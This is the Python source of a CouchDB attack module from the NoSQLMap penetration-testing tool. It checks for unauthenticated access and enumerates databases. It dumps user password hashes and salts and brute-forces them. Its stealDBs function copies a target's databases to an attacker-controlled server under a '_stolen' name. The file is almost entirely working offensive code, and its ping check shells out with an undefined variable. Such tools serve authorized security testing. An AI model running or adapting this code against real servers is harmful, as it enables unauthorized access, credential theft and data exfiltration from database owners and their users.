#!/usr/bin/env python3
# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
# See the file 'doc/COPYING' for copying permission

from .exceptions import NoSQLMapException
from . import brute
import couchdb
import urllib.request
import requests
import sys
from pbkdf2 import PBKDF2
from binascii import a2b_hex
from hashlib import sha1
import os


global dbList
global yes_tag
global no_tag
yes_tag = ["y", "Y"]
no_tag = ["n", "N"]


def args():
    return []


def couchScan(target, port, pingIt):
    if pingIt == True:
        test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")

        if test == 0:
            try:
                conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")

                try:
                    dbVer = conn.version()
                    return [0, dbVer]

                except couchdb.http.Unauthorized:
                    return [1, None]

                except NoSQLMapException:
                    return [2, None]

            except NoSQLMapException:
                return [3, None]

        else:
            return [4, None]

    else:
        try:
            conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")

            try:
                dbVer = conn.version()
                return [0, dbVer]

            except couchdb.http.Unauthorized:
                return [1, None]

            except NoSQLMapException:
                return [2, None]

        except NoSQLMapException:
            return [3, None]


def netAttacks(target, port, myIP, args=None):
    print("DB Access attacks (CouchDB)")
    print("======================")
    mgtOpen = False
    webOpen = False
    mgtSelect = True
    # This is a global for future use with other modules; may change
    dbList = []
    print("Checking to see if credentials are needed...")
    needCreds = couchScan(target, port, False)

    if needCreds[0] == 0:
        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
        print("Successful access with no credentials!")
        mgtOpen = True

    elif needCreds[0] == 1:
        print("Login required!")
        srvUser = input("Enter server username: ")
        srvPass = input("Enter server password: ")
        uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":" + str(port) + "/"

        try:
            conn = couchdb.Server(uri)
            print("CouchDB authenticated on " + target + ":" + str(port))
            mgtOpen = True

        except NoSQLMapException:
            input("Failed to authenticate.  Press enter to continue...")
            return

    elif needCreds[0] == 2:
        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
        print("Access check failure.  Testing will continue but will be unreliable.")
        mgtOpen = True

    elif needCreds[0] == 3:
        input(
            "Couldn't connect to CouchDB server.  Press enter to return to the main menu."
        )
        return

    mgtUrl = "http://" + target + ":" + str(port) + "/_utils"
    # Future rev:  Add web management interface parsing
    try:
        mgtRespCode = urllib.request.urlopen(mgtUrl).getcode()
        if mgtRespCode == 200:
            print(
                "Sofa web management open at "
                + mgtUrl
                + ".  No authentication required!"
            )

    except NoSQLMapException:
        print("Sofa web management closed or requires authentication.")

    if mgtOpen == True:
        while mgtSelect:
            print("\n")
            print("1-Get Server Version and Platform")
            print("2-Enumerate Databases/Users/Password Hashes")
            print("3-Check for Attachments (still under development)")
            print("4-Clone a Database")
            print("5-Return to Main Menu")
            attack = input("Select an attack: ")

            if attack == "1":
                print("\n")
                getPlatInfo(conn, target)

            if attack == "2":
                print("\n")
                enumDbs(conn, target, port)

            if attack == "3":
                print("\n")
                enumAtt(conn, target, port)

            if attack == "4":
                print("\n")
                stealDBs(myIP, conn, target, port)

            if attack == "5":
                return


def getPlatInfo(couchConn, target):
    print("Server Info:")
    print("CouchDB Version: " + couchConn.version())
    return


def enumAtt(conn, target, port):
    dbList = []
    print("Enumerating all attachments...")

    for db in conn:
        dbList.append(db)

    for dbName in dbList:
        r = requests.get(
            "http://" + target + ":" + str(port) + "/" + dbName + "/_all_docs"
        )
        dbDict = r.json()


def enumDbs(couchConn, target, port):
    dbList = []
    userNames = []
    userHashes = []
    userSalts = []
    try:
        for db in couchConn:
            dbList.append(db)

        print("List of databases:")
        print("\n".join(dbList))
        print("\n")

    except NoSQLMapException:
        print(
            "Error:  Couldn't list databases.  The provided credentials may not have rights."
        )

    if "_users" in dbList:
        r = requests.get(
            "http://"
            + target
            + ":"
            + str(port)
            + '/_users/_all_docs?startkey="org.couchdb.user"&include_docs=true'
        )
        userDict = r.json()

        for counter in range(0, int(userDict["total_rows"]) - int(userDict["offset"])):
            if float(couchConn.version()[0:3]) < 1.3:
                userNames.append(userDict["rows"][counter]["id"].split(":")[1])
                userHashes.append(userDict["rows"][counter]["doc"]["password_sha"])
                userSalts.append(userDict["rows"][counter]["doc"]["salt"])

            else:
                userNames.append(userDict["rows"][counter]["id"].split(":")[1])
                userHashes.append(userDict["rows"][counter]["doc"]["derived_key"])
                userSalts.append(userDict["rows"][counter]["doc"]["salt"])

        print("Database Users and Password Hashes:")

        for x in range(0, len(userNames)):
            print("Username: " + userNames[x])
            print("Hash: " + userHashes[x])
            print("Salt: " + userSalts[x])
            print("\n")

            crack = input("Crack this hash (y/n)? ")

            if crack in yes_tag:
                passCrack(
                    userNames[x], userHashes[x], userSalts[x], couchConn.version()
                )

    return


def stealDBs(myDB, couchConn, target, port):
    dbLoot = True
    menuItem = 1
    dbList = []

    for db in couchConn:
        dbList.append(db)

    if len(dbList) == 0:
        print(
            "Can't get a list of databases to steal.  The provided credentials may not have rights."
        )
        return

    for dbName in dbList:
        print(str(menuItem) + "-" + dbName)
        menuItem += 1

    while dbLoot:
        dbLoot = input("Select a database to steal:")

        if int(dbLoot) > menuItem:
            print("Invalid selection.")

        else:
            break

    try:
        # Create the DB target first
        myServer = couchdb.Server("http://" + myDB + ":5984")
        targetDB = myServer.create(dbList[int(dbLoot) - 1] + "_stolen")
        couchConn.replicate(
            dbList[int(dbLoot) - 1],
            "http://" + myDB + ":5984/" + dbList[int(dbLoot) - 1] + "_stolen",
        )

        cloneAnother = input("Database cloned.  Copy another (y/n)? ")

        if cloneAnother in yes_tag:
            stealDBs(myDB, couchConn, target, port)

        else:
            return

    except NoSQLMapException:
        input(
            "Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return..."
        )
        return


def verify_couch(candidate, salt, encPass, dbVer):
    """Return True if ``candidate`` matches the stored CouchDB password hash.

    CouchDB switched from SHA-1 to PBKDF2 in v1.3, so the scheme is chosen
    from the server version.
    """
    if float(dbVer[0:3]) < 1.3:
        return sha1((candidate + salt).encode()).hexdigest() == encPass
    return PBKDF2(candidate.encode(), salt.encode(), 10).read(20) == a2b_hex(encPass)


def passCrack(user, encPass, salt, dbVer):
    brute.crack(lambda c: verify_couch(c, salt, encPass, dbVer), "Password Cracked - ")
